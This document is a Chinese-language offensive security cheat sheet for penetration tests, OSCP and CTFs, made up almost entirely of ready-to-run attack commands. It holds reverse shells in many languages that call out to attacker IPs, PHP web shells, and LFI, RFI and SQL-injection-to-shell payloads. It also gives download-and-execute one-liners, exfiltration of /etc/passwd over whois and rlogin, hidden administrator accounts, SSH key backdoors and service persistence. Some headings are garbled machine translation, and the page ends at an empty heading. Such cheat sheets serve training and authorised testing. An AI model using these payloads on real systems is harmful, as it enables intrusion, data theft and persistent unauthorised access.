---
description: >-
  Convenient commands for your pentesting / red-teaming engagements, OSCP and
  CTFs.
---

# 渗透备忘录

## 探测 / 枚举

### 从Nmap扫描中获取在线的IP

```text
nmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep "/open" | cut -d " " -f 2 > exposed-services-ips
```

### 简单的端口探活

```text
for x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; done
```

### DNS 查找, 区域变化& 暴力破解

```text
whois domain.com
dig {a|txt|ns|mx} domain.com
dig {a|txt|ns|mx} domain.com @ns1.domain.com
host -t {a|txt|ns|mx} megacorpone.com
host -a megacorpone.com
host -l megacorpone.com ns1.megacorpone.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsenum domain.com
nslookup -> set type=any -> ls -d domain.com
for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done
```

### 端口 Banner 信息获取

```text
nc -v $TARGET 80
telnet $TARGET 80
curl -vX $TARGET
```

### NFS 共享文件服务

列出NFS共享目录。. 如果'rw,no\_root\_squash'是现在的状态, no\_root\_squash 登入 NFS 主机使用分享目录的使用者，如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限

```text
showmount -e 192.168.110.102
chown root:root sid-shell; chmod +s sid-shell
```

### Kerberos 枚举

```text
# users
nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test'
```

### HTTP 暴力破解 & 漏洞扫描

```text
target=10.0.0.1; gobuster -u http://$target -r -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 150 -l | tee $target-gobuster
target=10.0.0.1; nikto -h http://$target:80 | tee $target-nikto
target=10.0.0.1; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
```

### RPC / NetBios / SMB

```text
rpcinfo -p $TARGET
nbtscan $TARGET
​
#list shares
smbclient -L //$TARGET -U ""
​
# null session
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
```

### SNMP

```text
# Windows 用户帐户
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.25
​
# Windows 运行程序
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.4.2.1.2
​
# Windows 主机名称
snmpwalk -c public -v1 $TARGET .1.3.6.1.2.1.1.5
​
# Windows 共享信息
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.3.1.1
​
# Windows 共享信息
snmpwalk -c public -v1 $TARGET 1.3.6.1.4.1.77.1.2.27
​
# Windows TCP 端口
snmpwalk -c public -v1 $TARGET4 1.3.6.1.2.1.6.13.1.3
​
# 软件名称
snmpwalk -c public -v1 $TARGET 1.3.6.1.2.1.25.6.3.1.2
​
#暴力破解共同体字符串
onesixtyone -i snmp-ips.txt -c community.txt
​
snmp-check $TARGET
```

### SMTP简单邮件传输协议

```text
smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
```

### 活动目录

```text
# 当前域信息
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
​
# 域信任
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
​
# 当前域森林信息
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
​
# 建立域森林信任关系
([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', 'forest-of-interest.local')))).GetAllTrustRelationships()
​
# 获得一个域的DCs
nltest /dclist:offense.local
net group "domain controllers" /domain
​
# 获取当前经过身份验证的会话的DC
nltest /dsgetdc:offense.local
​
# 从cmd shell获取域信任
nltest /domain_trusts
​
# 获取用户信息
nltest /user:"spotless"
​
# 获取当前经过身份验证的会话的DC
set l
​
# 获取认证用户的域名和DC
klist
​
# 获取所有登录会话。包括NTLM认证的会话
klist sessions
​
# 会话的kerberos票据
klist
​
# krbtgt缓存
klist tgt
​
#我在旧的Windows系统上是谁
set u
​
# 找到DFS共享与ADModule
Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name
​
# 查找与ADSI的DFS共享
$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}
​
# 检查主机上是否运行假脱机程序服务
powershell ls "\\dc01\pipe\spoolss"
```

### 监听端口 \(Powershell\)

```text
# 在端口443上启动监听器
$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
 
while($true)
{
    $client = $listener.AcceptTcpClient();
    Write-Host $client.client.RemoteEndPoint "connected!";
    $client.Close();
    start-sleep -seconds 1;
}
```

## 权限取得

### 使用限制壳

#### **Bash**

```text
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

#### **Perl**

```text
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### **URL-Encoded Perl: Linux**

```text
echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew
```

#### **Python**

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### **PHP**

```text
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### **Ruby**

```text
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### **Netcat without -e \#1**

```text
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f
```

#### **Netcat without -e \#2**

```text
nc localhost 443 | /bin/sh | nc localhost 444
telnet localhost 443 | /bin/sh | telnet localhost 444
```

#### **Java**

```text
r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
```

#### **XTerm**

```text
xterm -display 10.0.0.1:1
```

#### JDWP RCE

```text
print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec("whoami").getInputStream())).readLine())
```

### 使用限制壳

```text
# 极少数情况下
ssh bill@localhost ls -l /tmp
```

```text
nice /bin/bash
```

#### 交互式 TTY Shells

```text
/usr/bin/expect sh
```

```text
python -c ‘import pty; pty.spawn(“/bin/sh”)’
# 如果您没有访问shell的权限，则使用su作为另一个用户执行一个命令 Credit to g0blin.co.uk
python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
```

#### 通过WWW上传表格上传/张贴文件

```text
# POST 上传文件
curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"

# POST 上传二进制数据到web表单
curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

#### 通过PUT把文件放到网站主机上

```text
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
```

#### 生成有效载荷模式和计算偏移量

```text
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP_VALUE
```

#### 绕过File 上传

* file.php -&gt; file.jpg
* file.php -&gt; file.php.jpg
* file.asp -&gt; file.asp;.jpg
* file.gif \(contains php code, but starts with string GIF/GIF98\)
* 00%
* file.jpg with php backdoor in exif \(see below\)
* .jpg -&gt; proxy intercept -&gt; rename to .php

#### 将PHP注入JPEG

```text
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
exiftool “-comment<=back.php” back.png
```

#### 上传.htaccess 解释 .blah 成 .php

```text
AddType application/x-httpd-php .blah
```

### 暴力破解密码

#### **使用Hydra破解Web表单**

```text
hydra 10.10.10.52 http-post-form -L /usr/share/wordlists/list "/endpoit/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s PORT -P /usr/share/wordlists/list
```

#### **使用Hydra破解通用协议**

```text
hydra 10.10.10.52 -l username -P /usr/share/wordlists/list ftp|ssh|smb://10.0.0.1
```

#### **HashCat开裂**

```text
# 基于模式的暴力破解;
hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout  

# 生成密码候选:wordlist + pattern;
hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout

# 用internalMonologue生成NetNLTMv2，用hashcat破解
InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
# 生成的哈希
spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000

# 裂纹与hashcat
hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

#### 使用msfvenom产生有效载荷

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.245 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

#### 从Linux编译代码

```text
# Windows
i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe

# Linux
gcc -m32|-m64 -o output source.c
```

#### **从Windows编译程序集**

```text
# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
nasm -f win64 .\hello.asm -o .\hello.obj

# http://www.godevtool.com/Golink.zip
GoLink.exe -o .\hello.exe .\hello.obj
```

#### **本地文件包含到Shell**

```text
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

# Then send as cmd payload via http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
```

**本地文件包含:读取文件**

```text
file:///etc/passwd

http://example.com/index.php?page=php://input&cmd=ls
    POST: <?php system($_GET['cmd']); ?>
http://192.168.2.237/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
    POST: <?php system('uname -a');die(); ?>

expect://whoami
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=&cmd=id
http://10.1.1.1/index.php?page=data://text/plain,%3C?php%20system%28%22uname%20-a%22%29;%20?%3E

# ZIP Wrapper
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;   
mv payload.zip shell.jpg;    
http://example.com/index.php?page=zip://shell.jpg%23payload.php

# 循环遍历文件描述符
curl '' -H 'Cookie: PHPSESSID=df74dce800c96bcac1f59d3b3d42087d' --output -
```

**远程文件包含Shell: Windows + PHP**

```text
<?php system("powershell -Command \"& {(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.245/netcat/nc.exe','nc.exe'); cmd /c nc.exe 10.11.0.245 4444 -e cmd.exe\" }"); ?>
```

**SQL注入到Shell或后门**

```text
# Assumed 3 columns
http://target/index.php?vulnParam=0' UNION ALL SELECT 1,"<?php system($_REQUEST['cmd']);?>",2,3 INTO OUTFILE "c:/evil.php"-- uMj
```

```text
# sqlmap;post-捕获请求通过Burp代理通过保存项目到文件.
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10
```

```text
# 当xp_cmdshell可用时，netcat通过mssql注入反向shell
1000';+exec+master.dbo.xp_cmdshell+'(echo+open+10.11.0.245%26echo+anonymous%26echo+whatever%26echo+binary%26echo+get+nc.exe%26echo+bye)+>+c:\ftp.txt+%26+ftp+-s:c:\ftp.txt+%26+nc.exe+10.11.0.245+443+-e+cmd';--
```

**SQLite注入到Shell或后门**

```text
ATTACH DATABASE '/home/www/public_html/uploads/phpinfo.php' as pwn; 
CREATE TABLE pwn.shell (code TEXT); 
INSERT INTO pwn.shell (code) VALUES ('<?php system($_REQUEST['cmd']);?>');
```

**ms sql控制台**

```text
mssqlclient.py -port 27900 user:password@10.1.1.1
sqsh -S 10.1.1.1 -U user -P password
```

**Upgradig非交互式Shell**

```text
python -c 'import pty; pty.spawn("/bin/sh")'
/bin/busybox sh
```

**Python输入代码注入**

```text
__import__('os').system('id')
```

**本地枚举和权限升级**

**检查AppLocker策略**

```text
Get-AppLockerPolicy -Local).RuleCollections
Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
```

**Applocker:可写的Windows目录**

```text
# list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
C:\Windows\Tasks
C:\Windows\Temp
C:\windows\tracing
C:\Windows\Registration\CRMLog
C:\Windows\System32\FxsTmp
C:\Windows\System32\com\dmp
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\spool\SERVERS
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
C:\Windows\SysWOW64\FxsTmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
```

**在Windows中找到可写的文件/文件夹**

```text
$a = Get-ChildItem "c:\windows\" -recurse -ErrorAction SilentlyContinue
$a | % {
    $fileName = $_.fullname
    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match "full|modify|write" -and $_.identityreference -match "authenticated users|everyone|$env:username"}
    if($acls -ne $null)
    {
        [pscustomobject]@{
            filename = $fileName
            user = $acls | select -exp identityreference
        }
    }
}
```

**检查是否启用了Powershell日志记录**

```text
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
```

**检查WinEvent日志是否暴露了安全字符串**

```text
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'
```

**检查WinEvent机器唤醒/休眠时间**

```text
Get-WinEvent -FilterHashTable @{ ProviderName = 'Microsoft-Windows-Power-TroubleShooter'  ; Id = 1 }|Select-Object -Property @{n='Sleep';e={$_.Properties[0].Value}},@{n='Wake';e={$_.Properties[1].Value}}
```

#### 审计政策

```text
auditpol /get /category:*
```

**检查PPL中是否运行LSASS**

```text
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
```

**使用ImmunityDebugger进行二进制开发**

**得到加载模块**

```text
# 我们对没有保护、读取和执行的模块感兴趣
permissions
!mona modules
```

**查找JMP ESP地址**

```text
!mona find -s "\xFF\xE4" -m moduleName
```

**破解ZIP密码**

```text
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip
```

**设置简单HTTP服务器**

```text
# Linux
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
```

#### MySQL用户自定义功能权限升级

Requires raptor\_udf2.c and sid-shell.c or full raptor.tar:

{% file src="../../.gitbook/assets/sid-shell.c" %}

{% file src="../../.gitbook/assets/raptor\_udf2.c" %}

{% file src="../../.gitbook/assets/raptor.tar" %}

```text
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```text
use mysql;
create table npn(line blob);
insert into npn values(load_file('/tmp/raptor_udf2.so'));
select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');
```

**码头工人特权Esclation**

```text
echo -e "FROM ubuntu:14.04\nENV WORKDIR /stuff\nRUN mkdir -p /stuff\nVOLUME [ /stuff ]\nWORKDIR /stuff" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh
```

**重新设置root密码**

```text
echo "root:spotless" | chpasswd
```

**上传文件到目标机器**

**TFTP**

```text
#TFTP Linux: cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
service atftpd start

# Windows
tftp -i $ATTACKER get /download/location/file /save/location/file
```

**FTP**

```text
# Linux: set up ftp server with anonymous logon access;
twistd -n ftp -p 21 -r /file/to/serve

# Windows shell: read FTP commands from ftp-commands.txt non-interactively;
echo open $ATTACKER>ftp-commands.txt
echo anonymous>>ftp-commands.txt
echo whatever>>ftp-commands.txt
echo binary>>ftp-commands.txt
echo get file.exe>>ftp-commands.txt
echo bye>>ftp-commands.txt 
ftp -s:ftp-commands.txt

# Or just a one-liner
(echo open 10.11.0.245&echo anonymous&echo whatever&echo binary&echo get nc.exe&echo bye) > ftp.txt & ftp -s:ftp.txt & nc.exe 10.11.0.245 443 -e cmd
```

**CertUtil**

```text
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

**PHP**

```text
<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
```

**Python**

```text
python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
```

**HTTP: Powershell**

```text
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');

# download using default proxy credentials and launch
powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
```

**HTTP: VBScript**

Copy and paste contents of [wget.vbs](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/wget-cscript) into a Windows Shell and then:

```text
cscript wget.vbs http://$ATTACKER/file.exe localfile.exe
```

**HTTP: Linux**

```text
wget http://$ATTACKER/file
curl http://$ATTACKER/file -O
scp ~/file/file.bin user@$TARGET:tmp/backdoor.py
```

**NetCat**

```text
# Attacker
nc -l -p 4444 < /tool/file.exe

# Victim
nc $ATTACKER 4444 > file.exe
```

**HTTP: Windows”调试。exe”方法**

```text
# 1. In Linux, convert binary to hex ascii:
wine /usr/share/windows-binaries/exe2bat.exe /root/tools/netcat/nc.exe nc.txt
# 2. Paste nc.txt into Windows Shell.
```

**HTTP: Windows BitsAdmin**

```text
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://$ATTACKER/payload.exe %tmp%\payload.exe&start %tmp%\payload.exe
```

**Wscript脚本代码的下载和执行**

{% tabs %} {% tab title="cmd" %}

```text
echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
```

{% endtab %}

{% tab title="code.js" %}

```text
<?xml version="1.0"?>
<package>
<component id="PopCalc">
<script language="JScript">
    <![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc"); 
    ]]>
</script>
</component>
</package>
```

{% endtab %} {% endtabs %}

**域名查询服务数据漏出**

```text
# attacker
nc -l -v -p 43 | sed "s/ //g" | base64 -d
# victim
whois -h $attackerIP -p 43 `cat /etc/passwd | base64`
```

#### 数据泄露

```text
cancel -u "$(cat /etc/passwd)" -h ip:port
```

**远程登录命令数据漏出**

```text
rlogin -l "$(cat /etc/passwd)" -p port host
```

**Bash平扫**

```text
#!/bin/bash
for lastOctet in {1..254}; do 
    ping -c 1 10.0.0.$lastOctet | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done
```

#### 在Python中使用1字节键强制XOR'ed字符串

```text
encrypted = "encrypted-string-here"
for i in range(0,255):
    print("".join([chr(ord(e) ^ i) for e in encrypted]))
```

**生成坏字符串**

```text
# Python
'\\'.join([ "x{:02x}".format(i) for i in range(1,256) ])
```

```text
# Bash
for i in {1..255}; do printf "\\\x%02x" $i; done; echo -e "\r"
```

#### 将Python转换为Windows可执行文件\(.py -&gt;. exe \)

```text
python pyinstaller.py --onefile convert-to-exe.py
```

**使用NetCat进行端口扫描**

```text
nc -nvv -w 1 -z host 1000-2000
nc -nv -u -z -w 1 host 160-162
```

**使用Masscan进行端口扫描**

```text
masscan -p1-65535,U:1-65535 10.10.10.x --rate=1000 -e tun0
```

#### 利用脆弱的Windows服务:薄弱的服务权限

```text
# 在输出中查找SERVICE ALL访问
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

sc config [service_name] binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
sc qc [service_name] (to verify!)
sc start [service_name]
```

#### 查找为给定用户显式设置的文件/文件夹权限

```text
icacls.exe C:\folder /findsid userName-or-*sid /t
//look for (F)ull, (M)odify, (W)rite
```

**始终安装升高的MSI**

```text
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated & reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### Windows存储凭证

```text
c:\unattend.xml
c:\sysprep.inf
c:\sysprep\sysprep.xml
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
dir /s *cred* == *pass* == *.conf

# Windows Autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Registry
reg query HKLM /f password /t REG_SZ /s 
reg query HKCU /f password /t REG_SZ /s
```

#### Unquoted 服务路径

```text
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

#### Persistence via 服务

```text
# cmd
sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""

# powersehll
New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName "'C:\Program Files\NotEvil\back.exe'" -Description "Not at all"
```

**端口转发/ SSH隧道**

**SSL:本地端口转发**

```text
# 监听本地端口8080，并通过SSH_SERVER将传入流量转发到REMOT_HOST: port
# 通过SSH_SERVER访问被防火墙阻止的主机;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER
```

**SSH:端口动态转发**

```text
# 监听本地端口8080。进入127.0.0.1:8080的流量通过SSH_SERVER将其转发到最终目的地
# 场景:通过SSH隧道代理您的web流量，或通过受损的DMZ框访问内部网络上的主机;
ssh -D 127.0.0.1:8080 user@SSH_SERVER
```

**SSH:远程端口转发**

```text
# 场景:通过SSH隧道代理您的web流量，或通过受损的DMZ框访问内部网络上的主机;
# 在非路由网络上暴露RDP;
ssh -R 5555:LOCAL_HOST:3389 user@SSH_SERVER
plink -R ATTACKER:ATTACKER_PORT:127.0.01:80 -l root -pw pw ATTACKER_IP
```

**代理隧道**

```text
# 打开本地端口127.0.0.1:5555。进入5555的流量通过PROXY_HOST:3128代理到DESTINATION_HOST
# 场景:远程主机运行SSH，但是它只绑定到127.0.0.1，但是您想要到达它;
proxytunnel -p PROXY_HOST:3128 -d DESTINATION_HOST:22 -a 5555
ssh user@127.0.0.1 -p 5555
```

**HTTP隧道:SSH Over HTTP**

```text
# 服务器-打开端口80。将所有传入流量重定向到localhost:80到localhost:22
hts -F localhost:22 80

# 客户端-打开端口8080。重定向所有传入流量到localhost:8080到192.168.1.15:80
htc -F 8080 192.168.1.15:80

# 客户端-连接到本地主机:8080 ->得到隧道到192.168.1.15:80 ->得到重定向到192.168.1.15:22
ssh localhost -p 8080
```

**Netsh—Windows端口转发**

```text
# requires admin
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
```

**RunAs /启动进程As**

**PowerShell**

```text
# Requires PSRemoting
$username = 'Administrator';$password = '1234test';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;Invoke-Command -Credential $credential -ComputerName COMPUTER_NAME -Command { whoami }

# without PSRemoting
cmd> powershell Start-Process cmd.exe -Credential (New-Object System.Management.Automation.PSCredential 'username', (ConvertTo-SecureString 'password' -AsPlainText -Force))

# without PS Remoting, with arguments
cmd> powershell -command "start-process cmd.exe -argumentlist '/c calc' -Credential (New-Object System.Management.Automation.PSCredential 'username',(ConvertTo-SecureString 'password' -AsPlainText -Force))"
```

**CMD**

```text
# 需要交互式控制台
runas /user:userName cmd.exe
```

**PsExec**

```text
psexec -accepteula -u user -p password cmd /c c:\temp\nc.exe 10.11.0.245 80 -e cmd.exe
```

**Pth-WinExe**

```text
pth-winexe -U user%pass --runas=user%pass //10.1.1.1 cmd.exe
```

#### 递归地查找隐藏文件: Windows

```text
dir /A:H /s "c:\program files"
```

#### 文件搜索

```text
# 查询本地db以快速查找文件。在执行locate之前执行updatedb。
locate passwd 

# 显示哪个文件将在当前环境中执行，这取决于$PATH环境变量;
which nc wget curl php perl python netcat tftp telnet ftp

# 以/etc开头递归搜索*.conf文件(不区分大小写);
find /etc -iname *.conf
```

#### 后开发和维护访问

#### 浏览注册蜂巢

```text
hivesh /registry/file
```

#### 解密RDG密码

远程桌面连接管理器的密码可以在加密的同一计算机/帐户上解密:

```text
Copy-Item 'C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll’
Import-Module C:\temp\RDCMan.dll
$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)
```

#### 解密VNC密码

```text
wine vncpwdump.exe -k key
```

#### 创建用户并添加本地管理员

```text
net user spotless spotless /add & net localgroup Administrators spotless /add
```

#### 隐藏新创建的本地管理员

```text
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f
```

#### 创建SSH授权密钥

```text
mkdir /root/.ssh 2>/dev/null; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChKCUsFVWj1Nz8SiM01Zw/BOWcMNs2Zwz3MdT7leLU9/Un4mZ7vjco0ctsyh2swjphWr5WZG28BN90+tkyj3su23UzrlgEu3SaOjVgxhkx/Pnbvuua9Qs9gWbWyRxexaC1eDb0pKXHH2Msx+GlyjfDOngq8tR6tkU8u1S4lXKLejaptiz0q6P0CcR6hD42IYkqyuWTNrFdSGLtiPCBDZMZ/5g1cJsyR59n54IpV0b2muE3F7+NPQmLx57IxoPjYPNUbC6RPh/Saf7o/552iOcmVCdLQDR/9I+jdZIgrOpstqSiJooU9+JImlUtAkFxZ9SHvtRbFt47iH7Sh7LiefP5 root@kali' >> /root/.ssh/authorized_keys
```

#### 创建没有密码的后门用户

